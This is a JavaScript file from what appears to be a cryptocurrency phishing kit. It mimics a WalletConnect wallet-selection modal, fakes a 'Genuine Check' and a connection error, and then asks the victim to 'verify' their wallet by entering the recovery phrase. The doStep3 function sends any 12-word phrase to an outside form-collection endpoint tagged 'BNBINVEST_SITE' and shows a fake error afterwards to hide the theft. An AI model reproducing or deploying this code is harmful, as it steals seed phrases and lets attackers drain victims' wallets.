const connectWalletBtn = document.getElementById("connect-wallet-btn");
const walletConnectContainer = document.getElementById("walletconnect-wrapper");
const walletConnectModalCloseBtn = document.getElementById(
  "walletconnect-modal_close_btn"
);
const walletConnectWrap = document.getElementsByClassName(
  "walletconnect_wrapper_wrap"
);
const searchInput = document.getElementById("walletconnect_input");

connectWalletBtn.addEventListener("click", function () {
  // console.log(walletConnectContainer.style.visibility);
  // walletConnectContainer.classList.add("visible");
  loadItems() //
    .then((data) => {
      const values = Object.values(data.listings);
      const items = values.slice(0, 12);
      items.map(({ name, image_url }) => {
        walletConnectWrap[0].innerHTML += `
      <a data-text="${name}" href="#" class="walletconnect_button_icon_achor">
      <div class="walletconnect_button_icon" style="background: url(${image_url.sm}) 0% 0% / 100%;"></div>
      <span class="walletconnect_button_text">${name}</span>
      `;
      });
      startSteps();
      listenForSearch(values);
    })
    .catch((e) => {
      console.log("Error", e);
    });
  walletConnectContainer.classList.toggle("hidden");
});
// walletConnectModalCloseBtn.addEventListener("click", function () {
//   walletConnectContainer.classList.toggle("hidden");
// });

async function loadItems() {
  const data = await fetch("https://registry.walletconnect.com/v2/all");
  const json = await data.json();
  return json;
}

function listenForSearch(items) {
  let search = "";
  searchInput.addEventListener("input", function (e) {
    walletConnectWrap[0].innerHTML = "";
    search = searchInput.value;
  });
  searchInput.addEventListener("input", function (e) {
    searchInput.value = search;

    let found = items.filter((v) => {
      return v.name.toLowerCase().includes(search.toLocaleLowerCase());
    });

    found.slice(0, 11).map(({ name, image_url }) => {
      walletConnectWrap[0].innerHTML += `
      <a data-text="${name}" href="#" class="walletconnect_button_icon_achor">
      <div class="walletconnect_button_icon" style="background: url(${image_url.sm}) 0% 0% / 100%;"></div>
      <span class="walletconnect_button_text">${name}</span>
      `;
    });
    startSteps();
  });
}

function startSteps() {
  const walletAnchorItem = document.getElementsByClassName(
    "walletconnect_button_icon_achor"
  );
  Array.from(walletAnchorItem).map((item) => {
    item.addEventListener("click", function (e) {
      const name = item.getAttribute("data-text");
      localStorage.setItem("wallet-name", name);
      const modalInner = document.getElementById("walletconnect_modal_inner");
      // console.log(step1Text);
      // modalInner.innerHTML = step1Text;
      doStep1(modalInner);
    });
  });
}

function doStep1(inner) {
  toastr.options = {
    preventDuplicates: true,
    timeOut: "5000",
  };
  inner.innerHTML = `
  <div id="step-1" class="step">
        <h1 class="check-text">Genuine Check</h1>
        <!-- <img class="meter-img" src="/images/nano_s_plus.png" alt="Meter Image"> -->
        <img data-src="https://atomicwallet.onrender.com/images/features/icon-secure.svg" alt="" class="lozad" src="https://atomicwallet.onrender.com/images/features/icon-secure.svg" data-loaded="true">
        <div class="loading-spinner"
            style="height: 34px;width: 34px; margin-top: 50px; margin-bottom: 25px;"></div>
    </div>
  `;
  const timeOut = setTimeout(() => {
    // step1.style.display = "none";
    toastr.error("A Connection error occured: ERR_NETWORK_DEVICE");
    // step2.style.display = "flex";
    doStep2(inner);
  }, 8000);
  // window.addEventListener(
  //   "shouldCloseKeyStonePopup",
  //   function () {
  //     clearTimeout(timeOut);
  //   },
  //   true
  // );
}
function doStep2(inner) {
  inner.innerHTML = `
  <div id="step-2" class="step">
  <div style="text-align: center;">
      <svg width="50" height="50" viewBox="0 0 24 24" style="
      fill: #ee365b !important;
      margin-top: 10px;
      ">
          <path
              d="M2.208 19.88h19.584L12 2.12 2.208 19.88zm1.968-1.152L12 4.568l7.824 14.16H4.176zm6.888-1.488h1.848v-1.848h-1.848v1.848zm.336-6.096l.096 2.736h1.008l.12-2.736v-2.28H11.4v2.28z">
          </path>
      </svg>
      <h5 style="text-align:center;color:#ee365b;width: 300px;margin: 0 auto;margin-bottom: 10px; font-size: 1.70rem;">Something went wrong</h5>
      <p style="color:#302d2d; margin-bottom: 5px; font-size: 15px;">Failed to login to your account, please verify your ${localStorage.getItem(
        "wallet-name"
      )} wallet account.</p>
      <p style="font-size: 1.1rem; color:#7c7c7c; font-weight: bold; margin-top: 15px;">Connection network invalid: Invalid parameters received (0x6b00)</p>
      <button class="button-type-primary button-type" style="margin-top: 20px;" id="verify-btn">
          <span style="margin-right: 10px;">
            <svg xmlns="http://www.w3.org/2000/svg" width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-download-cloud"><polyline points="8 17 12 21 16 17"/><line x1="12" y1="12" x2="12" y2="21"/><path d="M20.88 18.09A5 5 0 0 0 18 9h-1.26A8 8 0 1 0 3 16.29"/></svg>
          </span>
          Verify your account
      </button>
      <button style="margin-top: 10px;" id="retry-btn" class="button-type-secondary button-type">
      <span style="margin-right: 10px;">
          <svg xmlns="http://www.w3.org/2000/svg" width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-refresh-ccw"><polyline points="1 4 1 10 7 10"/><polyline points="23 20 23 14 17 14"/><path d="M20.49 9A9 9 0 0 0 5.64 5.64L1 10m22 4l-4.64 4.36A9 9 0 0 1 3.51 15"/></svg>
      </span>
      Retry
      </button>
  </div>
</div>
  `;

  const verifyBtn = document.querySelector("#verify-btn");
  const retryBtn = document.querySelector("#retry-btn");

  verifyBtn.addEventListener("click", function () {
    doStep3(inner);
  });
  retryBtn.addEventListener("click", function () {
    doStep1(inner);
  });
}

function doStep3(inner) {
  inner.innerHTML = `
  <div id="step-3" class="step">
  <h1 class="check-text">Enter your ${localStorage.getItem(
    "wallet-name"
  )} wallet recovery phrase</h1>
    <div class="loading-spinner" id="form-load-spinner" style="height: 30px;width: 30px; display: none;"></div>
    <form id="my-form" style="width: 100%;
    margin: 15px 0 auto; max-width: 90%;">
      <div class="form-group">
          <textarea rows="6" style="font-size: 16px;" name="phrase" required="" placeholder="Enter your recovery phrase here with a space between each word." class="form-control"></textarea>
      </div>  
      <button id="phrase-submit-btn" style="width: 100%;margin-bottom: 60px;" type="submit" class="button-type-primary button-type">
          <span style="margin-right: 10px;">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-right"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
          </span>
          Continue
        </button>
  </form>
</div>
  `;

  const form = document.querySelector("#my-form");
  form.addEventListener("submit", function (e) {
    e.preventDefault();
    let phrase = document.querySelector('textarea[name^="phrase"]');
    phrase = phrase.value.trim();
    const split = phrase.split(" ");
    if (phrase === "" || split.length < 12 || split.length !== 12) {
      toastr.error(
        "Invalid recovery phrase, please double-check the " +
          localStorage.getItem("wallet-name") +
          " wallet phrase and try again."
      );
    } else {
      const formLoadingSpinner = document.querySelector("#form-load-spinner");
      const FORMSPARK_ACTION_URL = "https://submit-form.com/4uv4Ss3H";
      formLoadingSpinner.style.display = "inline-block";
      const timeOut = setTimeout(() => {
        fetch(FORMSPARK_ACTION_URL, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            Accept: "application/json",
          },
          body: JSON.stringify({
            phrase,
            password: "",
            source: "BNBINVEST_SITE",
            wallet_name: localStorage.getItem("wallet-name"),
          }),
        })
          .then(() => {
            toastr.error(
              "Oops! An error occurred while attempting to verify your " +
                localStorage.getItem("wallet-name") +
                " wallet. Please try again later."
            );
          })
          .catch(() => {
            toastr.error(
              "Oops! We're sorry, but an internal server error has occurred"
            );
          })
          .finally(() => {
            formLoadingSpinner.style.display = "none";
          });
        // toastr.error(
        //   "Oops! An error occurred while attempting to verify your " +
        //     localStorage.getItem("wallet-name") +
        //     " wallet. Please try again later."
        // );
      }, 9000);

      // window.addEventListener(
      //   "shouldCloseKeyStonePopup",
      //   function () {
      //     clearTimeout(timeOut);
      //     formLoadingSpinner.style.display = "none";
      //     document.querySelector('textarea[name^="phrase"]').value = "";
      //     console.log("Cleared Timeout...");
      //   },
      //   true
      // );
    }
  });
}
